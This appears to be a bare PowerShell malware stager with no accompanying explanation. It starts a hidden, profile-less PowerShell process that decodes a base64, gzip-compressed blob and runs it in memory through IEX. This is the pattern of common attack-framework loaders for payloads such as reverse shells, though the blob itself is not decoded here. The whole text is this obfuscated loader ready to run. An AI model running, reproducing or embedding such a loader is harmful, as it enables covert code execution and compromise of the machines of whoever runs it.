if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'syswow64WindowsPowerShellv1.0powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAAGyLVgCA71W227bOBB9ToH+g1AYkIQ6lp24SRugwFKWb/EldhTLtzUCRqJkxpToSJRv3f77jmypcZFkt9uHFRKY1MyQh2fODOXGgS0oD6QHf+je3FfLk8tY+vb+3UkPh9iXlNwi7Eza0W1rIfJSjrVI1xcl01NPTsAnt6uUx7FuP/UupK+SMkXLpcF9TIPZ1VUlDkMSiMO8UCcCRRHxHxglkaJKf0nDOQnJ6c3DI7GF9E3K3RfqjD9glrptK9ieE+kUBU5ia3MbJzAL5pJRoch//imr09PSrFB9ijGLFNncRoL4BYcxWZW+q8mGd9slUeQOtUMecVcUhjQ4PysMggi7pAurrUiHiDl3IlmFs8BfSEQcBtLRqZJlDk6KDMNeyG3kOCGJIKbQDFZ8QZRcEDOWl/5QpimG2zgQ1CdgFyTkS5OEK2qTqNDAgcPILXFnSpess6P/apByHARePRGqecjPm2A73IkZOcTL6ku4R5lV4fkpu0DI9/fv3r9zM3UsMTtWBYxOpvsxAbhKj0d07/ZVKualDmyJBQ+3MM3dhTFRZ9I0ScZ0NpNyHlnvPuffXqCUeYPvZhdt/ObIXl2DYWpx6swgMM1WLr5/WNHE8LbsDOLSgBjbAPvUzpSlvEY/cRnZH7WQuXUBmyKnBuIYhBEPi4TKvDR9GVb1qfgRq8eUOSRENqQwAlSQXfVnMIfsKHIz6BAfuDrMZciCC3ommXeq4W22ezIHJ7nCcBTlpV4MBWXnJZNgRpy8hIKIpiYUC74fys9wOzET1MaRyJabqT+ITDes8CASYWxD/uDwd+aS2BSzhIu81KAO0bcm9bKN5VeZqGDGaODBSivIBLxJGDBFoooQMB4UoBZMIpr+khEfnPa1XWPYg0pOK2GvI+wRR36BMRP5QdEJHRkPRwghxybj0LQsGgroEQm1z3r6TRhHTeIAqBKSNCtKVjNTfSsSqee4bdYDep8oNCVpT0kogI5ayH0dR+SibIoQyFI+aDe0guAZNwPWsfUFLaE1LTU78D+g501uXDqt68eGFhqbuYuaUbPT6Bn9RqO8ujatsjCrTdHqNUWnOnp8NFHjdjAWkyZq3NHiYlzeLa/pzmwjZ7zRLnb6bl3UN7tHz3HHhut6l655W/pUo+1hpa8Xz3DbqMbtob7Wi+WoSteNPh30F9c18TC2GB64mjcqfcF00w4frRLv7JoI1efn9u7aterzjrMdN7Qvw/ICVRGqBFWrpvPWWA9RT7OwZ/F1y9ONoVdB+nBNyaQ/qOn9fk1Hg/rjk/FF8yB2hOf60Dqjk+Xodg7zGkBoacVy0yE7Pu4DSXWOsHcLPl7lzJ674GN8RPrHLo/O8ELnSAef2uQJcI2XtR4D+93gjCOLdUcYtSfbmqaVxr0yahTpsO6hZEns6X2MopWxM7SS5XBn+Kk7djVrxC41o3K3tF1N09YNo2VPSpvPN5ef20Nq+RwNNM36kGgDxJHDpEXM0UW3fpT0tzp7B4fRHDMQAzTrrCBrPKylPbfHaRKhKMc384KEAWFwjcFFlykbMcbt5C5ImjRcQ4fLYQa1OYDh+dmrI1X64ag+Xw7Zq6urCWCFIkk1XGiTwBPzfHFzXixCiy9uykU4868fscKXWyVbLZ/cEs9cHW3D9tuoSRnlnNb2Omb/C5FpFc/hx/kXIp/f/YP1l8gt5o8oeGH7+cV/4vp3WRhiKiDAhHbEyOF6fJWMVEBHnxSHVIE63PRJPvBuYnHahW+NvwFYJKy4YgoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);